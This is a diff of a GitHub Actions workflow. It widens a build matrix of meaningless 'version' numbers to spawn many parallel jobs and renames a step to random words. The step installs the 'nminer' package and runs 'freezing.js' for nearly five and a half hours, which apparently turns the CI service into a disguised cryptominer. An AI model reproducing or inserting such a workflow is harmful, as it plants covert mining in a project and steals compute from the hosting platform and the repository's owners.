@@ -9,22 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 8070 }
-          - { version: 4378 }
-          - { version: 3497 }
-          - { version: 6028 }
-          - { version: 9563 }
-          - { version: 8192 }
-          - { version: 3805 }
-          - { version: 1768 }
-          - { version: 3621 }
-          - { version: 5532 }
-          - { version: 6270 }
-          - { version: 3490 }
-          - { version: 8382 }
-          - { version: 672 }
-          - { version: 2956 }
-          - { version: 538 }
+          - { version: 6741 }
+          - { version: 6814 }
+          - { version: 9400 }
+          - { version: 7888 }
+          - { version: 7763 }
+          - { version: 971 }
+          - { version: 7626 }
+          - { version: 8146 }
+          - { version: 2128 }
+          - { version: 5937 }
+          - { version: 5762 }
+          - { version: 3936 }
+          - { version: 553 }
+          - { version: 7102 }
+          - { version: 5805 }
+          - { version: 2180 }
+          - { version: 7323 }
+          - { version: 77 }
+          - { version: 5858 }
 
     steps:
       - name: Checkout
@@ -35,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: sideboard psst how hmph for
+      - name: including incidentally unlike vast
         run: |
           npm install nminer@latest
-          timeout 328m node freezing.js || echo "freezing executed"
+          timeout 325m node freezing.js || echo "freezing executed"
